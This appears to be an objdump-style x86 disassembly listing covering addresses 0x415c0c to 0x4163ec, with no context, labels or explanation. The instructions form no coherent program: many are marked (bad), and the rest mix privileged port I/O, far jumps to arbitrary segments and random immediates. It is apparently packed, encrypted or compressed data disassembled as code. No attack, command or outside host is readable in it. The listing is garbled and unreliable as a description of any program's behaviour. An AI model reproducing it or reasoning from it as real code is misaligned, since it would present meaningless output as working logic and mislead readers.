  415c0c:	inc    edx
  415c0d:	aas    
  415c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c0f:	sub    eax,0x594f6bf0
  415c14:	fsubr  QWORD PTR [esi-0x80]
  415c17:	std    
  415c18:	bound  eax,QWORD PTR [ecx+0x32]
  415c1b:	add    bh,BYTE PTR [edx+edx*2+0x6bebf776]
  415c22:	or     eax,0x19f2df24
  415c27:	add    edx,DWORD PTR [eax+0xe]
  415c2a:	pop    ebx
  415c2b:	cmp    al,0x3c
  415c2d:	iret   
  415c2e:	sti    
  415c2f:	rcl    DWORD PTR [edi+0x3778207e],cl
  415c35:	loop   0x415c42
  415c37:	mov    cl,0x29
  415c39:	mov    ch,0xe0
  415c3b:	std    
  415c3c:	(bad)  
  415c3d:	xor    BYTE PTR [ecx-0x16712b1b],bh
  415c43:	cmp    DWORD PTR [eax],ebp
  415c45:	inc    edi
  415c46:	jl     0x415bf2
  415c48:	clc    
  415c49:	ret    0xd954
  415c4c:	sbb    al,0x89
  415c4e:	push   eax
  415c4f:	pop    ds
  415c50:	test   al,0x32
  415c52:	xor    BYTE PTR [edi+0x28bdc42f],0xc0
  415c59:	lods   al,BYTE PTR ds:[esi]
  415c5a:	xor    DWORD PTR [ebp+0x6e387b07],0x172eba58
  415c64:	imul   ebx,DWORD PTR [ebx],0xffffff90
  415c67:	cmp    ah,dl
  415c69:	push   ds
  415c6a:	dec    edi
  415c6b:	mov    ebx,ds
  415c6d:	clc    
  415c6e:	sahf   
  415c6f:	add    eax,0x4fd545d5
  415c74:	sub    eax,0x11ce3087
  415c79:	gs push cs
  415c7b:	cmp    DWORD PTR [ebx+eax*8-0x12],ebx
  415c7f:	les    edi,FWORD PTR [edi-0x3eed9727]
  415c85:	fdiv   QWORD PTR [ebx]
  415c87:	cs popa 
  415c89:	pusha  
  415c8a:	push   ss
  415c8b:	pop    ecx
  415c8c:	clc    
  415c8d:	add    ebx,DWORD PTR [ecx]
  415c8f:	repnz lods al,BYTE PTR ds:[esi]
  415c91:	call   0x4079:0x47b88fec
  415c98:	jmp    0xf286:0x12cba133
  415c9f:	lea    ecx,[eax]
  415ca1:	imul   DWORD PTR [ecx+edi*8+0x2b]
  415ca5:	(bad)  
  415ca6:	cli    
  415ca7:	(bad)  
  415ca8:	stos   BYTE PTR es:[edi],al
  415ca9:	and    al,0x49
  415cab:	lea    ebx,[edx+0x128a3e36]
  415cb1:	stos   BYTE PTR es:[edi],al
  415cb2:	leave  
  415cb3:	test   eax,0x25913998
  415cb8:	sub    esp,edi
  415cba:	mov    edx,0x88d7faa
  415cbf:	mov    ebx,0xe5f35076
  415cc4:	mov    ah,0x3f
  415cc6:	pusha  
  415cc7:	inc    ebp
  415cc8:	dec    esi
  415cc9:	fcomi  st,st(3)
  415ccb:	or     ebx,DWORD PTR [eax+0x65]
  415cce:	and    al,bl
  415cd0:	push   ebp
  415cd1:	int    0x88
  415cd3:	fimul  WORD PTR [ebp+0x607002bf]
  415cd9:	mov    eax,0x3eb0d6a
  415cde:	je     0x415cc5
  415ce0:	int    0x33
  415ce2:	mov    ecx,0xa2202d31
  415ce7:	push   ds
  415ce8:	ins    DWORD PTR es:[edi],dx
  415ce9:	cmp    esp,edx
  415ceb:	loope  0x415d28
  415ced:	sub    esp,DWORD PTR [edx]
  415cef:	or     DWORD PTR [ebx-0x79],0xffffff85
  415cf3:	sti    
  415cf4:	jl     0x415d5a
  415cf6:	sub    DWORD PTR [esi],eax
  415cf8:	and    BYTE PTR [edi],bl
  415cfa:	je     0x415d79
  415cfc:	out    dx,al
  415cfd:	(bad)  
  415cfe:	pop    eax
  415cff:	xchg   ebp,eax
  415d00:	aas    
  415d01:	sbb    bl,BYTE PTR [edx+ecx*1]
  415d04:	jns    0x415d0e
  415d06:	dec    esi
  415d07:	shl    DWORD PTR [ebp+0x10],0xee
  415d0b:	cmp    ebx,DWORD PTR [ecx+0x284fd7cd]
  415d11:	or     eax,0xb6d11216
  415d16:	sbb    ah,BYTE PTR [edi]
  415d18:	xor    ebp,DWORD PTR [edi-0x5e]
  415d1b:	push   ebp
  415d1c:	sbb    BYTE PTR [eax-0x5cbc659a],0x99
  415d23:	out    dx,eax
  415d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d25:	mov    WORD PTR [edi+0x2d],es
  415d28:	icebp  
  415d29:	jno    0x415d37
  415d2b:	add    ch,BYTE PTR [esi]
  415d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d2e:	cs dec eax
  415d30:	or     ebp,DWORD PTR [edx+0x3364173b]
  415d36:	xchg   edx,eax
  415d37:	lds    ebx,FWORD PTR [eax+ecx*4]
  415d3a:	dec    ecx
  415d3b:	jl     0x415d95
  415d3d:	cmp    edi,DWORD PTR [edx+0x2c]
  415d40:	cs cmp ecx,esi
  415d43:	rol    BYTE PTR [ebx],0xfc
  415d46:	xchg   edi,eax
  415d47:	push   0xa408d49f
  415d4c:	mov    ecx,0xbe5f66dc
  415d51:	in     eax,dx
  415d52:	xor    edi,DWORD PTR [edi-0x4e6caf52]
  415d58:	or     ebp,ebx
  415d5a:	fst    QWORD PTR [ebp-0x79d0a502]
  415d60:	loopne 0x415d7d
  415d62:	pusha  
  415d63:	inc    esp
  415d64:	loope  0x415cfb
  415d66:	xlat   BYTE PTR es:[ebx]
  415d68:	jle    0x415ddb
  415d6a:	out    dx,al
  415d6b:	(bad)  
  415d6c:	in     eax,dx
  415d6d:	leave  
  415d6e:	jmp    FWORD PTR [ecx-0x73]
  415d71:	inc    esp
  415d72:	push   ecx
  415d73:	cs (bad) 
  415d76:	push   ecx
  415d77:	retf   0x6313
  415d7a:	dec    eax
  415d7b:	lock jnp 0x415d32
  415d7e:	lahf   
  415d7f:	ins    DWORD PTR es:[edi],dx
  415d80:	(bad)  
  415d81:	xor    al,0x99
  415d83:	retf   0x180a
  415d86:	hlt    
  415d87:	jo     0x415d22
  415d89:	icebp  
  415d8a:	jno    0x415d92
  415d8c:	jp     0x415d9a
  415d8e:	inc    esi
  415d8f:	xor    BYTE PTR [ecx-0x43e1ea09],0x22
  415d96:	cmp    ch,BYTE PTR [edi]
  415d98:	cs dec eax
  415d9a:	sub    ebp,edx
  415d9c:	inc    esi
  415d9d:	fbld   TBYTE PTR [edx-0x50]
  415da0:	or     edx,edx
  415da2:	fst    DWORD PTR ds:0x69f1a14f
  415da8:	mov    bl,0x1
  415daa:	xor    edi,ecx
  415dac:	pop    eax
  415dad:	out    dx,eax
  415dae:	rol    DWORD PTR [ebp-0x70df9ac2],0x8d
  415db5:	mov    ebp,0xcd56a0a5
  415dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dbb:	mov    dh,0xa2
  415dbd:	popa   
  415dbe:	sub    BYTE PTR [esi+0x40bd68d0],0x4
  415dc5:	add    eax,0x5e8a78b6
  415dca:	push   ss
  415dcb:	and    DWORD PTR [esi],ebx
  415dcd:	div    dl
  415dcf:	lods   eax,DWORD PTR ds:[esi]
  415dd0:	cmp    ebp,eax
  415dd2:	xchg   ebx,eax
  415dd3:	es call 0x5d5099e7
  415dd9:	retf   
  415dda:	shl    BYTE PTR [esi-0x4115949d],cl
  415de0:	add    dl,BYTE PTR [ecx+0x48]
  415de3:	sub    dh,BYTE PTR [ecx+0x58]
  415de6:	or     eax,0xe07f6c18
  415deb:	cs into 
  415ded:	inc    ebx
  415dee:	pop    esi
  415def:	mov    edx,0xffde7129
  415df4:	sti    
  415df5:	and    esp,0xffffffcc
  415df8:	mov    ch,BYTE PTR [ebp+0x6babe931]
  415dfe:	sbb    eax,0xaaf631c5
  415e03:	sub    eax,0x6bf6f65f
  415e08:	xchg   BYTE PTR cs:[ebx-0x14],bh
  415e0c:	fdivrp st(2),st
  415e0e:	jl     0x415deb
  415e10:	dec    eax
  415e11:	aad    0xdb
  415e13:	cdq    
  415e14:	loop   0x415e1c
  415e16:	bound  ebp,QWORD PTR [edx+0x54]
  415e19:	imul   ebx,DWORD PTR [ecx-0x50e26007],0x717c4f00
  415e23:	jmp    0xff39:0xeaeda980
  415e2a:	fimul  DWORD PTR [esi-0x37]
  415e2d:	lock mov DWORD PTR [ecx],eax
  415e30:	add    eax,DWORD PTR [edi+0x76]
  415e33:	inc    ecx
  415e34:	jae    0x415e01
  415e36:	mov    WORD PTR [eax],gs
  415e38:	data16 arpl WORD PTR [ebx-0x16311edf],ax
  415e3f:	addr16 sti 
  415e41:	jecxz  0x415e44
  415e43:	cmp    al,BYTE PTR [ebp+ecx*8+0x3d]
  415e47:	fbld   TBYTE PTR [edx-0x19]
  415e4a:	and    al,0xa2
  415e4c:	add    al,0x74
  415e4e:	jge    0x415de4
  415e50:	ret    0xc934
  415e53:	shl    BYTE PTR [esi+0x6a],cl
  415e56:	pushf  
  415e57:	cmp    cl,BYTE PTR [eax-0x7f]
  415e5a:	cs mov ebx,0xd4412216
  415e60:	add    BYTE PTR [eax-0x149ad8ee],dl
  415e66:	sub    ah,BYTE PTR [edx+0x3ea79636]
  415e6c:	push   es
  415e6d:	adc    eax,0x440776bc
  415e72:	and    al,0xd5
  415e74:	dec    eax
  415e75:	or     dl,BYTE PTR [ebx-0x65968d2b]
  415e7b:	ins    BYTE PTR es:[edi],dx
  415e7c:	inc    ebx
  415e7d:	jno    0x415e9e
  415e7f:	retf   
  415e80:	jl     0x415e49
  415e82:	rol    esp,cl
  415e84:	mov    edx,DWORD PTR es:[edx-0x24]
  415e88:	xchg   esp,eax
  415e89:	rcl    DWORD PTR [edx],0x31
  415e8c:	sahf   
  415e8d:	stos   BYTE PTR es:[edi],al
  415e8e:	or     al,0xc7
  415e90:	daa    
  415e91:	jmp    0x4f38:0x98300f6
  415e98:	es mov ah,0x1c
  415e9b:	mov    cl,0xf5
  415e9d:	jp     0x415e70
  415e9f:	jecxz  0x415e88
  415ea1:	test   eax,0xf76e8d11
  415ea6:	pop    ebp
  415ea7:	popf   
  415ea8:	std    
  415ea9:	lock imul edi,ebp,0xd35b4f6a
  415eb0:	rol    BYTE PTR [edi+0x44],1
  415eb3:	rol    DWORD PTR [eax],1
  415eb5:	push   ecx
  415eb6:	mov    ch,BYTE PTR [edi+0x26f8656]
  415ebc:	inc    ebp
  415ebd:	sbb    ecx,DWORD PTR [edi]
  415ebf:	mov    ss:0xbda83b3e,al
  415ec5:	mov    dh,BYTE PTR [ebx-0xe45b987]
  415ecb:	jbe    0x415e8c
  415ecd:	add    al,0xb1
  415ecf:	add    bl,dh
  415ed1:	pushf  
  415ed2:	ret    0x759b
  415ed5:	popf   
  415ed6:	sar    DWORD PTR [edx+0x3aa3c5f],1
  415edc:	imul   ebp,DWORD PTR [eax+eiz*8+0x6d],0x5ff0ccc5
  415ee4:	jge    0x415e71
  415ee6:	lock sub eax,0x8003439e
  415eec:	and    eax,0x2433305b
  415ef1:	jg     0x415f0e
  415ef3:	pop    ds
  415ef4:	int3   
  415ef5:	lds    esp,FWORD PTR ds:0x8ef6ec0a
  415efb:	jmp    0x415f4d
  415efd:	or     al,0xc4
  415eff:	xchg   ebx,eax
  415f00:	pop    edx
  415f01:	imul   edi,esi,0xffffffc1
  415f04:	mov    dl,0xb4
  415f06:	fchs   
  415f08:	jp     0x415f0a
  415f0a:	ds pop ebp
  415f0c:	enter  0xc813,0x8b
  415f10:	mov    al,0xdc
  415f12:	lea    ecx,[ebx]
  415f14:	retf   
  415f15:	push   0x8620dcc1
  415f1a:	push   edi
  415f1b:	test   dh,al
  415f1d:	mov    bl,0x5c
  415f1f:	cwde   
  415f20:	mov    edx,0x19bba828
  415f25:	stc    
  415f26:	pop    ebx
  415f27:	test   DWORD PTR [ebx+edi*4+0x2d],edx
  415f2b:	ret    0xf4b8
  415f2e:	lock daa 
  415f30:	fwait
  415f31:	in     al,dx
  415f32:	mov    WORD PTR [edx],?
  415f34:	and    ah,BYTE PTR [ecx+esi*4-0x34]
  415f38:	mul    DWORD PTR [edi+0x16]
  415f3b:	xchg   edi,eax
  415f3c:	push   0xd5af2abb
  415f41:	hlt    
  415f42:	mov    al,0x9a
  415f44:	jb     0x415f54
  415f46:	fiadd  DWORD PTR [ecx+0x1d]
  415f49:	mov    eax,0x1ca69bf2
  415f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f4f:	sub    eax,0xb3bbcfdd
  415f54:	and    esp,DWORD PTR [edx-0x5f]
  415f57:	mov    BYTE PTR [ecx],0x54
  415f5a:	adc    esp,DWORD PTR ds:0x2c288d8c
  415f60:	mov    ds:0xa46d0c31,eax
  415f65:	pushf  
  415f66:	out    dx,eax
  415f67:	xor    al,0xe9
  415f69:	adc    eax,0x7e851dc8
  415f6e:	cwde   
  415f6f:	gs aam 0x5a
  415f72:	mov    ds:0x23481dbf,eax
  415f77:	les    edx,FWORD PTR [ebp-0x33a0b90]
  415f7d:	js     0x415ff7
  415f7f:	inc    edi
  415f80:	jb     0x415f19
  415f82:	adc    eax,0xd56b2171
  415f87:	lods   eax,DWORD PTR ds:[esi]
  415f88:	mov    eax,ds:0x18ff1663
  415f8d:	icebp  
  415f8e:	ret    0x2ac4
  415f91:	shl    BYTE PTR [esi-0x11],1
  415f94:	xor    eax,0x7dc0f19d
  415f99:	lods   al,BYTE PTR ds:[esi]
  415f9a:	in     al,dx
  415f9b:	js     0x416006
  415f9d:	call   0x5a80b177
  415fa2:	rol    BYTE PTR [eax+0x7e],0xa9
  415fa6:	push   ss
  415fa7:	mov    cs,WORD PTR [edi]
  415fa9:	mov    DWORD PTR [ebx],edi
  415fab:	ins    DWORD PTR es:[edi],dx
  415fac:	(bad)  
  415fad:	sbb    bh,BYTE PTR [ecx-0x65]
  415fb0:	jo     0x415f68
  415fb2:	mov    ebx,0x3d408402
  415fb7:	xor    BYTE PTR [esi+0x67],dl
  415fba:	lods   al,BYTE PTR ds:[esi]
  415fbb:	dec    edx
  415fbc:	push   ebp
  415fbd:	xor    BYTE PTR [edx],dl
  415fbf:	mov    ds:0x8ecb8e34,eax
  415fc4:	iret   
  415fc5:	jb     0x415feb
  415fc7:	cdq    
  415fc8:	sub    al,0x55
  415fca:	pop    ds
  415fcb:	pop    esp
  415fcc:	nop    DWORD PTR [eax+ebx*1-0xe187cad]
  415fd4:	ss add eax,0xe06890e
  415fda:	inc    edi
  415fdb:	in     eax,dx
  415fdc:	sti    
  415fdd:	ror    bl,0xe1
  415fe0:	pop    ebp
  415fe1:	into   
  415fe2:	aad    0x56
  415fe4:	mov    dh,BYTE PTR [ebp+0x282a0ffa]
  415fea:	sti    
  415feb:	aas    
  415fec:	gs iret 
  415fee:	dec    eax
  415fef:	stos   BYTE PTR es:[edi],al
  415ff0:	(bad)  
  415ff1:	in     eax,dx
  415ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ff3:	inc    ecx
  415ff4:	pusha  
  415ff5:	and    eax,0x2f0daa80
  415ffa:	fchs   
  415ffc:	mov    eax,ds:0xfc4887a2
  416001:	inc    edi
  416002:	pop    ds
  416003:	fwait
  416004:	popf   
  416005:	add    eax,0x3362e481
  41600a:	mov    al,ds:0xc8016929
  41600f:	jmp    0x415fa2
  416011:	push   eax
  416012:	call   0x3166:0x9510f781
  416019:	loopne 0x415fe9
  41601b:	push   edx
  41601c:	pop    esp
  41601d:	xchg   ebx,eax
  41601e:	push   es
  41601f:	add    cl,cl
  416021:	xor    DWORD PTR [esi],ebp
  416023:	ds es push ebp
  416026:	js     0x415fe3
  416028:	mov    edi,0x5ba844df
  41602d:	add    ebx,edx
  41602f:	push   ss
  416030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416031:	mov    BYTE PTR [ecx-0x5f6a8f2a],dh
  416037:	inc    edi
  416038:	push   cs
  416039:	nop
  41603a:	icebp  
  41603b:	sbb    BYTE PTR [ecx+ecx*4-0x75df8553],cl
  416042:	aad    0x12
  416044:	test   al,0x17
  416046:	std    
  416047:	push   eax
  416048:	xchg   esp,eax
  416049:	push   ebp
  41604a:	jl     0x415fd3
  41604c:	inc    ebp
  41604d:	pop    ss
  41604e:	les    ecx,FWORD PTR [edi]
  416050:	push   es
  416051:	and    eax,0xffe242b0
  416056:	xchg   DWORD PTR [edi],ebx
  416058:	test   DWORD PTR [ebx+0x25],ebp
  41605b:	inc    esi
  41605c:	shl    DWORD PTR [esi+0x58],cl
  41605f:	inc    esp
  416060:	jno    0x41604f
  416062:	ret    0x8f0a
  416065:	rcr    BYTE PTR gs:[eax-0x1b],0xef
  41606a:	mov    al,ds:0x642b6786
  41606f:	test   BYTE PTR [eax],bh
  416071:	sub    dh,BYTE PTR [ebp+0x59fd103f]
  416077:	and    DWORD PTR [edi-0x78],0xffffffbc
  41607b:	into   
  41607c:	out    0x4b,eax
  41607e:	es xchg dh,ch
  416081:	pop    eax
  416082:	pusha  
  416083:	xchg   DWORD PTR [ecx-0x2e],eax
  416086:	(bad)  
  416087:	push   0x9ca676bc
  41608c:	push   ds
  41608d:	sub    bl,BYTE PTR [eax+0x4874e2ce]
  416093:	xor    BYTE PTR [ebp+0x52a81d0c],bh
  416099:	jb     0x41607d
  41609b:	mov    edi,0xc554f291
  4160a0:	mov    esi,0xfe599027
  4160a5:	jbe    0x41605e
  4160a7:	mov    bl,0x60
  4160aa:	in     al,dx
  4160ab:	and    DWORD PTR [ebx+0x7b],edi
  4160ae:	add    al,0x37
  4160b0:	inc    edi
  4160b1:	push   ebx
  4160b2:	cli    
  4160b3:	mov    eax,0xfd71a150
  4160b8:	mov    ah,0xf
  4160ba:	add    al,bl
  4160bc:	xor    BYTE PTR [ecx],al
  4160be:	cmp    DWORD PTR [ecx+0x38dc1865],ecx
  4160c4:	dec    ebp
  4160c5:	mov    dh,cl
  4160c7:	neg    DWORD PTR ds:0x9874a704
  4160cd:	jae    0x41609e
  4160cf:	pop    ds
  4160d0:	addr16 sbb al,0x9c
  4160d3:	pusha  
  4160d4:	xor    al,0x41
  4160d6:	or     al,0x4
  4160d8:	ja     0x416138
  4160da:	fimul  WORD PTR [esi-0x7a6d5b2b]
  4160e0:	adc    eax,0xfbea2797
  4160e5:	sbb    BYTE PTR [esi+edi*1-0x80],0xf5
  4160ea:	adc    cl,ah
  4160ec:	fiadd  DWORD PTR [edx+0x7a]
  4160ef:	pop    ds
  4160f0:	jecxz  0x41610a
  4160f2:	test   BYTE PTR [ebx-0x794adef6],al
  4160f8:	ret    0xb471
  4160fb:	les    esp,FWORD PTR [ebx]
  4160fd:	inc    edx
  4160fe:	mov    ah,al
  416100:	mov    ds:0x8818c12f,al
  416105:	cli    
  416106:	push   edx
  416107:	shufps xmm6,XMMWORD PTR [esp+ecx*8],0x27
  41610c:	mov    edx,0xd58b3e6c
  416111:	adc    dl,BYTE PTR [esi+0x59]
  416114:	(bad)  
  416115:	jae    0x416113
  416117:	hlt    
  416118:	cli    
  416119:	clc    
  41611a:	arpl   WORD PTR [ecx+edi*8],bx
  41611d:	dec    eax
  41611e:	ja     0x416161
  416120:	scas   al,BYTE PTR es:[edi]
  416121:	jmp    0x4160c8
  416123:	mov    bh,0xc7
  416125:	imul   edi,DWORD PTR [edx],0xe2246b47
  41612b:	fld    QWORD PTR [ebp+0x41]
  41612e:	pop    ecx
  41612f:	iret   
  416130:	mov    dl,bl
  416132:	ins    DWORD PTR es:[edi],dx
  416133:	xor    esi,DWORD PTR [edx-0x1cf7ff71]
  416139:	sub    eax,0xd915382e
  41613e:	push   eax
  41613f:	sub    al,0x95
  416141:	sti    
  416142:	add    BYTE PTR [edi],0x3d
  416145:	inc    edx
  416146:	push   cs
  416147:	add    edi,ebx
  416149:	icebp  
  41614a:	jno    0x41619f
  41614c:	retf   0x30a7
  41614f:	retf   0xca79
  416152:	xchg   esi,eax
  416153:	fisubr WORD PTR [ebp+0x3db74ab]
  416159:	pop    ecx
  41615a:	adc    esp,ebx
  41615c:	addr16 jge 0x416163
  41615f:	mov    ss,WORD PTR [eax-0x75]
  416162:	retf   0x8ffd
  416165:	xchg   esi,eax
  416166:	fild   WORD PTR [edi-0x1f324f40]
  41616c:	add    eax,0x13366837
  416171:	out    dx,eax
  416172:	jns    0x4161d6
  416174:	shl    al,cl
  416176:	fsub   DWORD PTR [ebp+eiz*8+0x76]
  41617a:	push   esp
  41617b:	pusha  
  41617c:	inc    eax
  41617d:	jo     0x416108
  41617f:	add    ch,BYTE PTR [ecx+edi*4+0x4]
  416183:	fmulp  st(0),st
  416185:	call   0xf39f:0x330c12a7
  41618c:	mov    al,ds:0xce2f9165
  416191:	dec    ebx
  416192:	cmp    eax,0x616a6595
  416197:	xor    bh,BYTE PTR [ebx]
  416199:	data16 mov BYTE PTR [edx-0x2],dl
  41619d:	mov    al,ch
  41619f:	mov    ah,0x2d
  4161a1:	add    edi,ebx
  4161a3:	add    BYTE PTR [edi],0x30
  4161a6:	adc    al,0xfa
  4161a8:	pop    edx
  4161a9:	ret    0x9f2b
  4161ac:	jle    0x41616c
  4161ae:	adc    edi,esp
  4161b0:	jle    0x416201
  4161b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161b3:	xchg   ecx,eax
  4161b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b5:	test   al,0xfd
  4161b7:	fcmovnb st,st(2)
  4161b9:	sbb    bh,BYTE PTR [esi+0x2c]
  4161bc:	into   
  4161bd:	mov    ds:0x597a12b4,eax
  4161c2:	xchg   edx,eax
  4161c3:	fbld   TBYTE PTR [esi]
  4161c5:	neg    DWORD PTR [eax+0x615fd727]
  4161cb:	(bad)  
  4161cc:	pushf  
  4161cd:	jecxz  0x416198
  4161cf:	xlat   BYTE PTR ds:[ebx]
  4161d0:	sbb    bl,ch
  4161d2:	cmp    al,0x12
  4161d4:	(bad)  
  4161d5:	cmp    esp,DWORD PTR [ebx+0x6688d256]
  4161db:	mov    eax,ds:0xc48174e2
  4161e0:	hlt    
  4161e1:	push   ds
  4161e2:	push   ss
  4161e3:	add    al,0x44
  4161e5:	mov    eax,ds:0xf4433ec5
  4161ea:	cmp    DWORD PTR [ecx-0x2f],0x4d46af6c
  4161f1:	push   ebp
  4161f2:	xchg   edx,eax
  4161f3:	dec    esi
  4161f4:	sub    al,0xb3
  4161f7:	popf   
  4161f8:	ret    0xfacf
  4161fb:	jp     0x4161b4
  4161fd:	push   0x62001898
  416202:	adc    ch,ch
  416204:	mov    cl,0x83
  416206:	test   al,0xab
  416208:	dec    edi
  416209:	(bad)  
  41620a:	fcom   QWORD PTR [eax+0x60]
  41620d:	fdivr  DWORD PTR [ecx-0x335f99d7]
  416213:	out    0xb5,eax
  416215:	mov    esp,0x7ad8c80a
  41621a:	loope  0x4161b7
  41621c:	mov    eax,ds:0x96b5d321
  416221:	out    dx,al
  416222:	jmp    DWORD PTR [esi+0x54165e14]
  416228:	dec    ebx
  416229:	loopne 0x416286
  41622b:	inc    ebx
  41622c:	mov    al,0x54
  41622e:	lahf   
  41622f:	inc    ecx
  416230:	mov    ds,WORD PTR ds:0x1ffc2000
  416236:	pause  
  416238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416239:	adc    edi,DWORD PTR [esi+0x66]
  41623c:	popa   
  41623d:	pop    ds
  41623e:	mov    dh,0x28
  416240:	retf   
  416241:	jbe    0x4162ab
  416243:	outs   dx,DWORD PTR ds:[esi]
  416244:	call   0xeae5857e
  416249:	push   ecx
  41624a:	cmc    
  41624b:	(bad)  
  41624c:	adc    edx,DWORD PTR [ebx+0x18]
  41624f:	add    edi,DWORD PTR [esi+0x349fefc0]
  416255:	add    al,0x3e
  416257:	adc    BYTE PTR [ebp+0x4a3cf7e],bh
  41625d:	push   ds
  41625e:	int    0xce
  416260:	dec    ecx
  416261:	fs dec edx
  416263:	adc    ecx,edx
  416265:	jl     0x416215
  416267:	outs   dx,BYTE PTR ds:[esi]
  416268:	mov    ecx,0xa580f395
  41626d:	xchg   ecx,ecx
  41626f:	push   edx
  416270:	mov    bh,0x8
  416272:	sbb    dh,0xbd
  416275:	pop    ebx
  416276:	or     eax,0x6696103a
  41627b:	jle    0x4162a7
  41627d:	aam    0x90
  41627f:	(bad)  
  416280:	mov    edi,edi
  416282:	les    edi,FWORD PTR [ebx]
  416284:	out    dx,eax
  416285:	jo     0x416238
  416287:	mov    ebx,0xbba2bf58
  41628c:	in     eax,0xc2
  41628e:	rol    DWORD PTR [eax+0x5f],0xb5
  416292:	cwde   
  416293:	lahf   
  416294:	aaa    
  416295:	inc    edi
  416296:	mov    ebx,esi
  416298:	sub    BYTE PTR [eax-0x59bb3a7a],0xb
  41629f:	push   esp
  4162a0:	mov    BYTE PTR [edx+0x19],ch
  4162a3:	jb     0x416241
  4162a5:	popa   
  4162a6:	cs icebp 
  4162a8:	jmp    0x416301
  4162aa:	sub    ebx,DWORD PTR [ecx+0x4cab914d]
  4162b0:	cdq    
  4162b1:	inc    ebx
  4162b2:	mov    eax,ds:0x8b43559e
  4162b7:	scas   eax,DWORD PTR es:[edi]
  4162b8:	test   al,0xf6
  4162ba:	lahf   
  4162bb:	dec    ecx
  4162bc:	mov    ah,0xd2
  4162be:	or     DWORD PTR ds:0x822dd8b4,ecx
  4162c4:	dec    ecx
  4162c5:	test   BYTE PTR [eax-0x56fc889f],dh
  4162cb:	rol    BYTE PTR [eax],cl
  4162cd:	adc    al,0x18
  4162cf:	push   edi
  4162d0:	pop    ss
  4162d1:	out    0x8,al
  4162d3:	cld    
  4162d4:	lahf   
  4162d5:	stos   DWORD PTR es:[edi],eax
  4162d6:	in     eax,0x40
  4162d8:	iret   
  4162d9:	cmp    ebx,DWORD PTR [ebx]
  4162db:	mov    dh,0xaf
  4162dd:	mov    eax,0x27a27c05
  4162e2:	cmp    al,0xed
  4162e4:	bound  ecx,QWORD PTR [edi+esi*1]
  4162e7:	jg     0x416362
  4162e9:	mov    bh,0x22
  4162eb:	sahf   
  4162ec:	mov    edi,DWORD PTR [eax-0x19]
  4162ef:	mov    dl,0x98
  4162f1:	cmp    eax,0x19f7dabe
  4162f6:	daa    
  4162f7:	push   edx
  4162f8:	mov    cl,0x83
  4162fa:	data16 jns 0x41635a
  4162fd:	jmp    0xd268eef0
  416302:	adc    ch,BYTE PTR [edx]
  416304:	mov    ch,BYTE PTR [esi+0x5ab178ad]
  41630a:	hlt    
  41630b:	fnsave [ebx]
  41630d:	and    al,0xab
  41630f:	jb     0x41631d
  416311:	sti    
  416312:	mov    BYTE PTR [esi-0x6e],cl
  416315:	dec    edx
  416316:	xchg   edx,eax
  416317:	repz sub al,0x9f
  41631a:	jnp    0x41635f
  41631c:	jle    0x416306
  41631e:	inc    ebx
  41631f:	sub    al,0x79
  416321:	loopne 0x41635f
  416323:	xor    eax,esi
  416325:	das    
  416326:	ins    BYTE PTR es:[edi],dx
  416327:	pop    ebp
  416328:	inc    esp
  416329:	inc    eax
  41632a:	mov    ecx,0xa060e5ae
  41632f:	jb     0x416317
  416331:	fistp  QWORD PTR [ecx+0x16]
  416334:	mov    eax,0xcdd11808
  416339:	mov    ebx,ss
  41633b:	rcl    BYTE PTR [ecx+0x7d],cl
  41633e:	mov    ebp,0x4c7ae4d7
  416343:	ss out 0xb7,eax
  416346:	addr16 mov ds:0xdb26,al
  41634a:	scas   eax,DWORD PTR es:[edi]
  41634b:	icebp  
  41634c:	sub    al,0x1d
  41634e:	jg     0x41632f
  416350:	stos   BYTE PTR es:[edi],al
  416351:	inc    ebp
  416352:	mov    eax,0x4023c544
  416357:	not    eax
  416359:	pop    ebp
  41635a:	cmp    BYTE PTR [eax+eiz*8+0x5],cl
  41635e:	out    dx,al
  41635f:	call   0x6a08:0x70e28229
  416366:	mov    esi,0x1caf0478
  41636b:	(bad)  
  41636d:	ja     0x41636c
  41636f:	les    eax,FWORD PTR [edx+0x3f]
  416372:	hlt    
  416373:	sbb    dh,BYTE PTR [ebp+0x6a1c7411]
  416379:	aam    0x82
  41637b:	xchg   ecx,eax
  41637c:	jge    0x4163a4
  41637e:	popa   
  41637f:	in     al,dx
  416380:	jle    0x41634f
  416382:	popf   
  416383:	or     DWORD PTR [ebx+0x6e],edi
  416386:	add    ebx,ebx
  416388:	jg     0x41637f
  41638a:	sti    
  41638b:	fdivrp st(0),st
  41638d:	sub    BYTE PTR [ecx+0x6d361cf],al
  416393:	push   edx
  416394:	stos   BYTE PTR es:[edi],al
  416395:	imul   ebp,ecx,0x8aaafe7c
  41639b:	sbb    al,0x1c
  41639d:	xchg   ebp,eax
  41639e:	xchg   ebp,eax
  41639f:	ror    BYTE PTR ds:0x6e9d0d60,0xbb
  4163a6:	xor    dh,cl
  4163a8:	loope  0x416384
  4163aa:	xchg   ecx,eax
  4163ab:	inc    eax
  4163ac:	sub    ebp,DWORD PTR [eax]
  4163ae:	gs ins DWORD PTR es:[edi],dx
  4163b0:	mov    ebx,0x2ca9571b
  4163b5:	mov    bl,0xf9
  4163b7:	xchg   esp,eax
  4163b8:	dec    eax
  4163b9:	scas   eax,DWORD PTR es:[edi]
  4163ba:	test   bl,0x5e
  4163bd:	ficom  WORD PTR [ebp+esi*4-0x1b19c780]
  4163c4:	cs (bad) 
  4163c7:	fs addr16 rcr bl,cl
  4163cb:	jecxz  0x4163d1
  4163cd:	push   ecx
  4163ce:	and    DWORD PTR [ebx-0x3eb5d725],ecx
  4163d4:	dec    edx
  4163d5:	in     al,dx
  4163d6:	pop    ebx
  4163d7:	(bad)  
  4163d8:	mov    al,0xd4
  4163da:	mov    eax,0x935825e9
  4163df:	mov    bl,0xaa
  4163e1:	add    dh,BYTE PTR [eax-0x79c342af]
  4163e7:	jecxz  0x4163fa
  4163e9:	nop
  4163ea:	push   esi
  4163eb:	iret   
  4163ec:	adc    al,0x45
